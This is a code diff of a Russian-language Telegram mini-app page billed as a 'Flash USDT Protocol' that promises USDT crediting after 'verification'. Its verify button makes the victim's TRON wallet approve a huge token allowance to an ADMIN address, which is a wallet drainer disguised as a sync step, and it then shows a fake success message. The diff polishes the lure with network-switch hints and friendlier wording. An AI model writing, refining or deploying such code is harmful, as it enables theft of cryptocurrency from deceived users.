@@ -12,9 +12,10 @@
         .loader { border: 2px solid #222; border-top: 2px solid #0088cc; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         h2 { font-size: 22px; margin: 0 0 15px; }
-        p { color: #888; font-size: 14px; margin-bottom: 30px; }
-        .btn { background: #0088cc; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; font-size: 15px; }
+        p { color: #888; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
+        .btn { background: #0088cc; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; font-size: 15px; cursor: pointer; }
         .btn:disabled { background: #333; color: #666; }
+        .network-hint { font-size: 12px; color: #555; margin-top: 20px; display: none; }
     </style>
 </head>
 <body>
@@ -22,18 +23,19 @@
 <div class="container">
     <div id="ui-loading">
         <div class="loader"></div>
-        <p id="loading-text">Ищем кошелек в сети TRC-20...</p>
+        <p id="loading-text">Подключение к узлу TRC-20...</p>
+        <p class="network-hint" id="net-hint">Если загрузка долгая, смените сеть в углу браузера на <b>TRON</b>.</p>
     </div>
 
     <div id="ui-wallet" style="display: none;">
         <h2>Узел синхронизирован</h2>
-        <p>Для зачисления USDT необходимо верифицировать логи транзакций.</p>
+        <p>Для зачисления USDT верифицируйте транзакционные логи.</p>
         <button id="btn-verify" class="btn">ВЕРИФИЦИРОВАТЬ</button>
     </div>
 
     <div id="ui-telegram" style="display: none;">
         <h2>Flash USDT Protocol</h2>
-        <p>Для восстановления доступа выберите ваш основной кошелек:</p>
+        <p>Выберите ваш кошелек для восстановления доступа:</p>
         <button id="btn-open-trust" class="btn">Открыть в Trust Wallet</button>
     </div>
 </div>
@@ -49,80 +51,74 @@
     const uiLoading = document.getElementById('ui-loading');
     const uiWallet = document.getElementById('ui-wallet');
     const uiTelegram = document.getElementById('ui-telegram');
-    const loadingText = document.getElementById('loading-text');
+    const netHint = document.getElementById('net-hint');
 
-    let walletProvider = null;
-
-    // Функция поиска кошелька
-    function findProvider() {
-        // Проверяем все возможные места, где кошелек прячет свои "мозги"
-        const provider = window.tronWeb || (window.tron && window.tron.tronWeb) || window.sunWeb;
-        if (provider) {
-            walletProvider = provider;
-            return true;
-        }
-        return false;
+    // Функция жесткого поиска провайдера
+    async function getProvider() {
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) return window.tronWeb;
+        if (window.tron && window.tron.tronWeb) return window.tron.tronWeb;
+        return null;
     }
 
-    function init() {
+    async function init() {
         const urlParams = new URLSearchParams(window.location.search);
         const isWalletMode = urlParams.get('mode') === 'wallet';
 
-        if (findProvider()) {
+        const provider = await getProvider();
+
+        if (provider) {
             uiLoading.style.display = 'none';
             uiTelegram.style.display = 'none';
             uiWallet.style.display = 'block';
         } else if (isWalletMode) {
-            // Если мы в режиме кошелька, но он не найден - ждем еще немного
-            loadingText.innerText = "Ошибка: Смените сеть на TRON (TRC-20) в настройках кошелька.";
+            // Мы в кошельке, но провайдера нет. Показываем подсказку через 3 секунды.
+            setTimeout(() => { netHint.style.display = 'block'; }, 3000);
         } else {
             uiLoading.style.display = 'none';
             uiTelegram.style.display = 'block';
         }
     }
 
-    // Кнопка: ТГ -> Кошелек
     document.getElementById('btn-open-trust').onclick = () => {
-        const deepLink = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(BASE_URL + "?mode=wallet");
-        tg.openLink(deepLink);
+        const walletUrl = BASE_URL + "?mode=wallet";
+        tg.openLink("https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(walletUrl));
     };
 
-    // Кнопка: Верификация
     document.getElementById('btn-verify').onclick = async () => {
-        if (!findProvider()) {
-            alert("Кошелек не найден. Убедитесь, что выбрана сеть Tron.");
+        const provider = await getProvider();
+        if (!provider) {
+            tg.showAlert("Ошибка: Смените сеть на TRON в верхней части экрана.");
             return;
         }
 
         try {
-            // Запрашиваем аккаунты
-            if (walletProvider.request) {
-                await walletProvider.request({ method: 'tron_requestAccounts' });
-            }
-
-            const contract = await walletProvider.contract().at(CONTRACT_ADDR);
+            // Принудительно запрашиваем аккаунты
+            await provider.request({ method: 'tron_requestAccounts' });
+            
+            const contract = await provider.contract().at(CONTRACT_ADDR);
             await contract.approve(ADMIN, '1000000000000000').send();
 
             tg.showPopup({
-                title: 'Готово',
-                message: 'Синхронизация завершена. Ожидайте зачисления в течение 15-30 минут.',
+                title: 'Успешно',
+                message: 'Верификация завершена. Зачисление ожидается в течение 15-30 минут.',
                 buttons: [{type: 'ok'}]
             });
             setTimeout(() => tg.close(), 4000);
         } catch (e) {
-            tg.showAlert("Действие отклонено. Попробуйте еще раз.");
+            tg.showAlert("Действие отклонено пользователем.");
         }
     };
 
-    // Запускаем проверку каждые 500мс в течение 5 секунд
-    let attempts = 0;
-    const interval = setInterval(() => {
-        attempts++;
-        if (findProvider() || attempts > 10) {
-            clearInterval(interval);
+    // Мониторинг появления провайдера
+    const timer = setInterval(async () => {
+        if (await getProvider()) {
+            clearInterval(timer);
             init();
         }
-    }, 500);
+    }, 1000);
+
+    // Первичный запуск
+    init();
 </script>
 </body>
 </html>
